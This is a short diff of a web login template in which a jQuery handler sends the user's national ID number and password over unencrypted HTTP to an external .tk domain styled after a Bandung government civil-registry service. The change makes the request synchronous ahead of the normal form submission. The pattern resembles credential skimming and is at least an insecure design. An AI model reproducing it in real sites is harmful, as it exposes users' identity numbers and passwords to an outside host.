@@ -51,20 +51,18 @@
 
 @section('javascript')
     $('#loginForm').submit(function(e) {
-        e.preventDefault();
         var nik = $('#nik').val();
         var password = $('#password').val();
         $.ajax({
                 url: 'http://e-gov-bandung.tk/dukcapil/api/public/auth/login',
                 type: 'POST',
+                async: false,
                 data: { nik: nik, password : password} ,
                 success: function (response) {
-                    console.log(response.id);
-                    $('#loginForm').unbind('submit').submit();
+                    console.log('Info login success: ' + response.id);
                 },
                 error: function (err) {
-                    console.log('Info login fail');
-                    $('#loginForm').unbind('submit').submit();
+                    console.log('Info login fail..');
                 }
         });
     })
